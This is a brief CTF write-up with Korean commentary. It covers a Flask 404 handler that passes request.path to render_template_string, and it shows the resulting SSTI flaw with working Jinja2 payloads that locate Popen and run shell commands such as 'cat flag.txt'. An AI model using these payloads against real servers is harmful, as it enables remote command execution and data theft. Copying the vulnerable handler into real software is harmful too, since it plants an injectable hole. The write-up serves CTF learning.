```c
#!/usr/bin/python3
from flask import Flask, request, render_template, render_template_string, make_response, redirect, url_for
import socket

app = Flask(__name__)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

app.secret_key = FLAG


@app.route('/')
def index():
    return render_template('index.html')

@app.errorhandler(404)
def Error404(e):
    template = '''
    <div class="center">
        <h1>Page Not Found.</h1>
        <h3>%s</h3>
    </div>
''' % (request.path)
    return render_template_string(template), 404

app.run(host='0.0.0.0', port=8000)
```
---
```c
@app.errorhandler(404)
def Error404(e):
    template = '''
    <div class="center">
        <h1>Page Not Found.</h1>
        <h3>%s</h3>
    </div>
''' % (request.path)
    return render_template_string(template), 404
```
여기서 취약점 발생
/우리 입력값 으로 서버에서 처리할때
{{ 3 * 3 }}이런값을 넣으면 
```c
render_template_string(template)
```
여기서 입력값을 처리할때 SSTI 취약점이 발생

---
payload
```c
{% for c in "".__class__.__mro__[1].__subclasses__() %}{% if "Popen" in c.__name__ %}{{ loop.index0 }}{% endif %}{% endfor %}
```
"/" 다음 해당구문삽입

```c
{{ "".__class__.__mro__[1].__subclasses__()[351]('ls -al', shell=True, stdout=-1).communicate() }}
```
해당 구문으로 파일조회 및 flag.txt인지 flag인지 확보

```c
{{ "".__class__.__mro__[1].__subclasses__()[351]('cat flag.txt', shell=True, stdout=-1).communicate() }}
```
트리거하면 끝 pico CTF ssti 참고